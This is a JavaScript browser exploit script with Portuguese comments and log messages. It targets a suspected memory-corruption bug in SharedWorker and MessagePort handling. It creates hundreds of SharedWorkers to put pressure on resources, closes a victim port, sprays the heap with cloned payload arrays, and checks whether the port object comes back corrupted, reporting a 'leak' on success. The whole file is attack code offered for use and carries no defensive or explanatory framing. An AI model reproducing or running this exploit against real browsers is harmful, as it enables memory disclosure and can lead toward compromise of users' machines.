var workers_stash = [];
var current_test_idx = 0;
var is_running = false;
var interval_ref = null;

// Inicialização automática
// Como é script clássico, ele roda assim que carrega
log("Sistema pronto (Modo Clássico). Clique para iniciar.", "success");

document.getElementById("btn_run").addEventListener("click", start_exploit);

async function start_exploit() {
    if (is_running) return;
    if (!window.SharedWorker) return log("Erro: Navegador incompatível.", "fail");
    
    is_running = true;
    const size = CONFIG.SIZES_TO_TEST[0]; // 0xA0
    
    log(`>>> INICIANDO LEAK HUNTER (0x${size.toString(16)}) <<<`, "warn");

    // Usa funções globais carregadas pelos outros scripts
    prepare_checkerboard_heap(size);
    
    const payload = build_leak_payload(size);

    workers_stash = [];
    for(let i=0; i<380; i++) {
        try { workers_stash.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
    }

    let p_count = 0;
    const limit = CONFIG.WORKER_LIMIT - 380;

    interval_ref = setInterval(() => {
        if (p_count >= limit) {
            clearInterval(interval_ref);
            
            const victim = workers_stash.pop();
            attempt_leak(victim, payload);
            
            is_running = false;
            return;
        }

        try {
            let w = new SharedWorker("data:text,1", "v_"+p_count);
            w.port.start();
            workers_stash.push(w);
            
            if(p_count % 5 == 0) log(`Pressão: ${381+p_count}`);
        } catch(e) {}
        
        p_count++;
    }, 60);
}

function attempt_leak(victim, payload) {
    log("!!! DISPARANDO SWAP (0xA0) !!!", "warn");
    
    const port = victim.port;
    victim.port.close();
    
    const spray = [];
    for (let k = 0; k < CONFIG.SPRAY_QUANTITY; k++) {
        // Slice funciona em arrays nativos para clonar
        spray.push(payload.slice(0));
    }

    setTimeout(() => {
        try {
            const s = port.toString();
            
            if (s.indexOf("MessagePort") === -1) {
                log("!!! SUCESSO ABSOLUTO !!!", "leak");
                log("Objeto Corrompido: " + s, "leak");
                alert("LEAK ENCONTRADO! Tamanho 0xA0 confirmado.");
            } else {
                log("Falha: Objeto intacto [object MessagePort].");
                try { let temp = port.onmessage; } catch(e) {
                    if(e.toString().match(/0x/)) {
                        log("LEAK NO ERRO: " + e, "leak");
                        alert("LEAK NO ERRO!");
                    }
                }
            }
        } catch (e) {
            log("ERRO CAPTURADO: " + e, "leak");
        }
        
        cleanup();
    }, 500);
}

function cleanup() {
    workers_stash.forEach(w => { try{w.port.close()}catch(e){} });
    clear_heap();
}
